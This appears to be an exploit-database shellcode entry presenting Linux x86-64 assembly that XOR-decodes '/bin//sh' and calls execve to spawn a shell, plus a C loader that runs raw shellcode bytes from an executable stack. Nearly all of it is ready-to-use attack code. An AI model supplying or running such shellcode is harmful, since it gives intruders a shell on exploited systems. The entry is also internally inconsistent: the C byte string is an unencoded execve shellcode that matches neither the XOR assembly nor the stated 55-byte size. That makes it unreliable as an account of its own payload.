# Exploit Title: Linux-x64 - create a shell with execve() sending argument using XOR (/bin//sh) [55 bytes]

# Shellcode Author: Alexys (0x177git)

# Tested on: Linux (x86_64)

# Shellcode Description: creating a new process using execve() syscall sending bin//sh as argument | (encrypted using XOR operation was QWORD size (/bin - //sh))

# Blog post: @MoreRubyOfSec (https://t.me/MoreRubyOfSec) on Telegram

# Original code:
[https://github.com/0x177git/xor-encrypted-execve-sh](https://github.com/0x177git/xor-encrypted-execve-sh/blob/main/execve-xor-encrypted-argv.asm)

---- Assembly code ----

section .text

global _start

_start:

xor eax, eax

xor edx, edx ; clear rdx (argv on execve() protoype)

mov qword [rsp-32], 0x7466684b ;

mov qword [rsp-28],0x60650b1d ; encrypted(/bin//sh) 0x60, 0x65, 0xb, 0x1d, 0x74, 0x66, 0x68, 0x4b

xor qword [rsp-32], 0x1a0f0a64

xor qword [rsp-28], 0x08162432 ; passwd 0x8, 0x16, 0x24, 0x32, 0x1a, 0xf, 0xa, 0x64

lea rdi, [rsp-32]

push rax ; end of string

push rdi ; send string to stack

mov rsi, rsp ; send address of RSP to rsi -> (arg on linux syscall architecture convection) || execve(rsi, rdx)

; call execve()

mov al, 0x3b

syscall

-
- - - shellcode execution using stack in c (

gcc -z execstack shellcode.c -o shellcode

) ----

/*

"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05"

;

*/

void

main

()
{
const

char

shellcode

[]

=

"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05"

;

void

(

*

f

)()

=

(

void

(

*

)())

shellcode

;

f

();
}